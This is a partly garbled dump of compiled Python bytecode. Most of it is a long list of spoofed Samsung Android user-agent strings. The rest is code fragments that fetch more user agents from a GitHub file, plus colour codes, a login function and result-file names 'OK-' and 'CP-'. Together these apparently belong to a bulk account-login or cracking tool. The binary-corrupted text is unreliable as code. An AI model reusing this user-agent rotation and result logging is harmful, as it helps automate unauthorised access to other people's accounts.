Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36rr   rs   rt   z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36rq   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36��Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36ru   z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36zMozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36z�Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa��Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36rv   z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36c                  ��  � 	 t          dd�  �        �                    �   �         �                    �   �         } | D ]}t          �                    |�  �         �d S #  t          j        d�  �        j        }t          dd�  �        } t          j	        dt          |�  �        �  �        }|D ]}| �                    |dz   �  �         �t          dd�  �        �                    �   �         �                    �   �         } Y d S xY w)Nz	bbnew.txtrH   z0https://github.com/EC-1709/a/blob/main/bbnew.txtz
.bbnew.txtrG   zline">(.*?)<�
)�open�read�
splitlines�ugen�append�requests�get�text�re�findallr   �write)�ua�ub�a�aa�uns        r   �uakur�   y   s�   � �
0�	�+�c�����!�!�,�,�.�.�"�� � �b��;�;�r�?�?�?�?�� ��0��L�C�D�D�I�!�	�,�s���"��Z��s�1�v�v�&�&�"�� � �b��8�8�B�t�G�����	�,�s��� � �"�"�-�-�/�/�"�"�"�"���s   �AA �BC8z[41m[1;97mz[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30m�[mz[93mz[32mz[95mz[33mz[0;34m�January�February�March�April�May�June�July�August�	September�October�November�December)r/   r3   r)   r1   �5r5   r-   r7   r+   rN   rO   rP   �Devember)�01�02�03�04�05�06�07�08�09rN   rO   rP   zOK-�-z.txtzCP-c                  �.   � t          j        d�  �         d S )N�clear)�os�system� r   r   r�   r�   �   s   � ���7�����r   c                  �"   � t          �   �          d S )N)�loginr�   r   r   �backr�   �   s   � ������r   c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )Nrx   gy�&1�|?)�sys�stdoutr�   �flush�time�sleep)�u�es     r   �jalanr�   �   sQ   � ��T��R�R�A�#�*�*�*�1�-�-�-�c�j�.>�.>�.@�.@�.@���E�AR�AR�AR�AR�R�Rr   c                  �  � t          j        t          t          t          t
          t          t          g�  �        } t          d�	                    g | � �d�t          � �d�t          � �d�| � �d�| � �d�| � �d�| � �d�| � �d	�| � �d
